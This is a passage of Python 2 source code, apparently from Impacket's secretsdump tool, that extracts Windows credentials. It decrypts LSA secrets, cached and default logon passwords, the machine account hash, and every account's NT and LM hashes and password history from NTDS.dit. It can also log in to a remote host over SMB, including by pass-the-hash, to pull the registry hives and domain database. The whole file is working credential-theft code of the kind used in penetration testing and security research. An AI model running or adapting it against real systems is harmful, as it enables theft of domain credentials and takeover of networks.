        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try: 
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                if self.__isRemote is True:
                    account = self.__remoteOps.getDefaultLoginAccount()
                    if account is None:
                        secret = '(Unknown User):'
                    else:
                        secret = "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = '(Unknown User):'
                secret += strDecoded       
        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try: 
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET: %s' % strDecoded
        elif upperName.startswith('$MACHINE.ACC'):
            # compute MD4 of the secret.. yes.. that is the nthash? :-o
            md4 = MD4.new()
            md4.update(secretItem)
            if self.__isRemote is True:
                machine, domain = self.__remoteOps.getMachineNameAndDomain()
                secret = "%s\\%s$:%s:%s:::" % (domain, machine, ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))
            else: 
                secret = "$MACHINE.ACC: %s:%s" % (ntlm.LMOWFv1('','').encode('hex'), md4.digest().encode('hex'))
            
        if secret != '':
            print secret
            self.__secretItems.append(secret)
        else:
            # Default print, hexdump
            self.__secretItems.append('%s:%s' % (name, secretItem.encode('hex')))
            hexdump(secretItem)

    def dumpSecrets(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        logging.info('Dumping LSA Secrets')

        # Let's first see if there are cached entries
        keys = self.enumKey('\\Policy\\Secrets')
        if keys == None:
            # No entries
            return
        try:
            # Remove unnecesary value
            keys.remove('NL$Control')
        except:
            pass

        if self.__LSAKey == '':
            self.__getLSASecretKey()

        for key in keys:
            logging.debug('Looking into %s' % key)
            value = self.getValue('\\Policy\\Secrets\\%s\\CurrVal\\default' % key)

            if value is not None:
                if self.__vistaStyle is True:
                    record = LSA_SECRET(value[1])
                    tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                    plainText = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
                    record = LSA_SECRET_BLOB(plainText)
                    secret = record['Secret']
                else:
                    secret = self.__decryptSecret(self.__LSAKey,value[1][0xc:])

                self.__printSecret(key, secret)
        
    def exportSecrets(self, fileName):
        if len(self.__secretItems) > 0:
            fd = open(fileName+'.secrets','w+')
            for item in self.__secretItems:
                fd.write(item+'\n')
            fd.close()

    def exportCached(self, fileName):
        if len(self.__cachedItems) > 0:
            fd = open(fileName+'.cached','w+')
            for item in self.__cachedItems:
                fd.write(item+'\n')
            fd.close()
             

class NTDSHashes():
    NAME_TO_INTERNAL = { 
        'uSNCreated':'ATTq131091',
        'uSNChanged':'ATTq131192',
        'name':'ATTm3',
        'objectGUID':'ATTk589826',
        'objectSid':'ATTr589970',
        'userAccountControl':'ATTj589832',
        'primaryGroupID':'ATTj589922',
        'accountExpires':'ATTq589983',
        'logonCount':'ATTj589993',
        'sAMAccountName':'ATTm590045',
        'sAMAccountType':'ATTj590126',
        'lastLogonTimestamp':'ATTq589876',
        'userPrincipalName':'ATTm590480',
        'unicodePwd':'ATTk589914',
        'dBCSPwd':'ATTk589879',
        'ntPwdHistory':'ATTk589918',
        'lmPwdHistory':'ATTk589984',
        'pekList':'ATTk590689',
    }

    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())

    SAM_NORMAL_USER_ACCOUNT = 0x30000000
    SAM_MACHINE_ACCOUNT     = 0x30000001
    SAM_TRUST_ACCOUNT       = 0x30000002

    ACCOUNT_TYPES = ( SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)
    
    class PEK_KEY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedPek','52s=""'),
        )

    class CRYPTED_HASH(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash','16s=""'),
        )

    class CRYPTED_HISTORY(Structure):
        structure = (
            ('Header','8s=""'),
            ('KeyMaterial','16s=""'),
            ('EncryptedHash',':'),
        )

    def __init__(self, ntdsFile, bootKey, isRemote = False, history = False, noLMHash = True):
        self.__bootKey = bootKey
        self.__NTDS = ntdsFile
        self.__history = history
        self.__noLMHash = noLMHash
        if self.__NTDS is not None:
            self.__ESEDB = ESENT_DB(ntdsFile, isRemote = isRemote)
            self.__cursor = self.__ESEDB.openTable('datatable')
        self.__tmpUsers = list()
        self.__PEK = None
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}

    def __getPek(self):
        logging.info('Searching for pekList, be patient')
        pek = None
        while True:
            record = self.__ESEDB.getNextRow(self.__cursor)
            if record is None:
                break
            elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
                pek =  record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
                break
            elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                # Okey.. we found some users, but we're not yet ready to process them.
                # Let's just store them in a temp list
                self.__tmpUsers.append(record)

        if pek is not None:
            encryptedPek = self.PEK_KEY(pek)
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(encryptedPek['KeyMaterial'])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.encrypt(encryptedPek['EncryptedPek'])
            self.__PEK = plainText[36:]

    def __removeRC4Layer(self, cryptedHash):
        md5 = hashlib.new('md5')
        md5.update(self.__PEK)
        md5.update(cryptedHash['KeyMaterial'])
        tmpKey = md5.digest()
        rc4 = ARC4.new(tmpKey)
        plainText = rc4.encrypt(cryptedHash['EncryptedHash'])

        return plainText

    def __removeDESLayer(self, cryptedHash, rid):
        Key1,Key2 = self.__cryptoCommon.deriveKey(int(rid))

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        decryptedHash = Crypt1.decrypt(cryptedHash[:8]) + Crypt2.decrypt(cryptedHash[8:])

        return decryptedHash

    def __decryptHash(self, record):
        logging.debug('Decrypting hash for user: %s' % record[self.NAME_TO_INTERNAL['name']])
        
        sid = SAMR_RPC_SID(record[self.NAME_TO_INTERNAL['objectSid']].decode('hex'))
        rid = sid.formatCanonical().split('-')[-1]

        if record[self.NAME_TO_INTERNAL['dBCSPwd']] is not None:
            encryptedLMHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['dBCSPwd']].decode('hex'))
            tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
            LMHash = self.__removeDESLayer(tmpLMHash, rid)
        else:
            LMHash = ntlm.LMOWFv1('','')
            encryptedLMHash = None

        if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
            encryptedNTHash = self.CRYPTED_HASH(record[self.NAME_TO_INTERNAL['unicodePwd']].decode('hex'))
            tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
            NTHash = self.__removeDESLayer(tmpNTHash, rid)
        else:
            NTHash = ntlm.NTOWFv1('','')
            encryptedNTHash = None

        if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
            domain = record[self.NAME_TO_INTERNAL['userPrincipalName']].split('@')[-1]
            userName = '%s\\%s' % (domain, record[self.NAME_TO_INTERNAL['sAMAccountName']])
        else: 
            userName = '%s' % record[self.NAME_TO_INTERNAL['sAMAccountName']]
 
        answer =  "%s:%s:%s:%s:::" % (userName, rid, LMHash.encode('hex'), NTHash.encode('hex'))
        self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')] = answer
        print answer
      
        if self.__history:
            LMHistory = []
            NTHistory = []
            if record[self.NAME_TO_INTERNAL['lmPwdHistory']] is not None:
                lmPwdHistory = record[self.NAME_TO_INTERNAL['lmPwdHistory']]
                encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
                tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
                for i in range(0, len(tmpLMHistory)/16):
                    LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
                    LMHistory.append(LMHash)

            if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
                ntPwdHistory = record[self.NAME_TO_INTERNAL['ntPwdHistory']]
                encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
                tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
                for i in range(0, len(tmpNTHistory)/16):
                    NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
                    NTHistory.append(NTHash)

            for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
                if self.__noLMHash:
                    lmhash = ntlm.LMOWFv1('','').encode('hex')
                else:
                    lmhash = LMHash.encode('hex')
            
                answer =  "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
                self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
                print answer
        

    def dump(self):
        if self.__NTDS is None:
            # No NTDS.dit file provided
            return
        logging.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)')
        # We start getting rows from the table aiming at reaching
        # the pekList. If we find users records we stored them 
        # in a temp list for later process.
        self.__getPek()
        if self.__PEK is not None:
            logging.info('Pek found and decrypted: 0x%s' % self.__PEK.encode('hex'))
            logging.info('Reading and decrypting hashes from %s ' % self.__NTDS)
            # First of all, if we have users already cached, let's decrypt their hashes
            for record in self.__tmpUsers:
                self.__decryptHash(record)
            # Now let's keep moving through the NTDS file and decrypting what we find
            while True:
                try:
                    record = self.__ESEDB.getNextRow(self.__cursor)
                except: 
                    logging.error('Error while calling getNextRow(), trying the next one')
                    continue 

                if record is None:
                    break
                try:
                    if record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES: 
                        self.__decryptHash(record)
                except Exception, e:
                    #import traceback
                    #print traceback.print_exc()
                    try:
                        logging.error("Error while processing row for user %s" % record[self.NAME_TO_INTERNAL['name']])
                        logging.error(str(e))
                    except: 
                        logging.error("Error while processing row!")
                        logging.error(str(e))
                        pass
         

    def export(self, fileName):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fd = open(fileName+'.ntds','w+')
            for item in items:
                try:
                    fd.write(self.__itemsFound[item]+'\n')
                except Exception, e:
                    try:
                        logging.error("Error writing entry %d, skipping" % item)
                    except:
                        logging.error("Error writing entry, skipping")
                    pass
            fd.close()

    def finish(self):
        if self.__NTDS is not None:
            self.__ESEDB.close()


class DumpSecrets:
    def __init__(self, address, username = '', password = '', domain='', hashes = None, system=False, security=False, sam=False, ntds=False, outputFileName = None, history=False):
        self.__remoteAddr = address
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__smbConnection = None
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__systemHive = system
        self.__securityHive = security
        self.__samHive = sam
        self.__ntdsFile = ntds
        self.__history = history
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = outputFileName

        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')
   

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
        self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def getBootKey(self):
        # Local Version whenever we are given the files directly
        bootKey = ''
        tmpKey = ''
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD','Skew1','GBG','Data']:
            logging.debug('Retrieving class info for %s'% key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet,key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + digit

        transforms = [ 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 ]

        tmpKey = tmpKey.decode('hex')

        for i in xrange(len(tmpKey)):
            bootKey += tmpKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % bootKey.encode('hex'))

        return bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet

        #noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)[1]
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0

        if noLmHash != 1:
            logging.debug('LMHashes are being stored')
            return False
        logging.debug('LMHashes are NOT being stored')
        return True

    def dump(self):
            try:
                if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
                    self.__isRemote = False
                    bootKey = self.getBootKey()
                    if self.__ntdsFile is not None:
                        # Let's grab target's configuration about LM Hashes storage
                        self.__noLMHash = self.checkNoLMHashPolicy()
                else:
                    self.__isRemote = True
                    self.connect()
                    self.__remoteOps  = RemoteOperations(self.__smbConnection)
                    self.__remoteOps.enableRegistry()
                    bootKey             = self.__remoteOps.getBootKey()
                    # Let's check whether target system stores LM Hashes
                    self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()

                if self.__isRemote == True:
                    SAMFileName         = self.__remoteOps.saveSAM()
                else:
                    SAMFileName         = self.__samHive

                self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
                self.__SAMHashes.dump()
                if self.__outputFileName is not None:
                    self.__SAMHashes.export(self.__outputFileName)

                if self.__isRemote == True:
                    SECURITYFileName    = self.__remoteOps.saveSECURITY()
                else:
                    SECURITYFileName    = self.__securityHive
                    
                self.__LSASecrets= LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote = self.__isRemote)
                self.__LSASecrets.dumpCachedHashes()
                if self.__outputFileName is not None:
                    self.__LSASecrets.exportCached(self.__outputFileName)
                self.__LSASecrets.dumpSecrets()
                if self.__outputFileName is not None:
                    self.__LSASecrets.exportSecrets(self.__outputFileName)

                if self.__isRemote == True:
                    NTDSFileName        = self.__remoteOps.saveNTDS()
                else:
                    NTDSFileName        = self.__ntdsFile

                self.__NTDSHashes   = NTDSHashes(NTDSFileName, bootKey, isRemote = self.__isRemote, history = self.__history, noLMHash = self.__noLMHash)
                self.__NTDSHashes.dump()

                if self.__outputFileName is not None:
                    self.__NTDSHashes.export(self.__outputFileName)

                self.cleanup()
            except (Exception, KeyboardInterrupt), e:
                #import traceback
                #print traceback.print_exc()
                logging.error(e)
                try:
                    self.cleanup()
                except:
                    pass

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()
        if self.__isRemote == True:
            self.__smbConnection.logoff()


# Process command-line arguments.
if __name__ == '__main__':
    print version.BANNER

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address> or LOCAL (if you want to parse local files)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
    parser.add_argument('-sam', action='store', help='SAM hive to parse')
    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
    parser.add_argument('-history', action='store_true', help='Dump password history')
    parser.add_argument('-outputfile', action='store', help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    if address.upper() == 'LOCAL' and username == '':
        if options.system is None:
            logging.error('SYSTEM hive is always required for local parsing, check help')
            sys.exit(1)
    else:

        if domain is None:
            domain = ''
    
        if password == '' and username != '' and options.hashes is None:
            from getpass import getpass
            password = getpass("Password:")

    dumper = DumpSecrets(address, username, password, domain, options.hashes, options.system, options.security, options.sam, options.ntds, options.outputfile, options.history)

    try:
        dumper.dump()
    except Exception, e:
        logging.error(e)
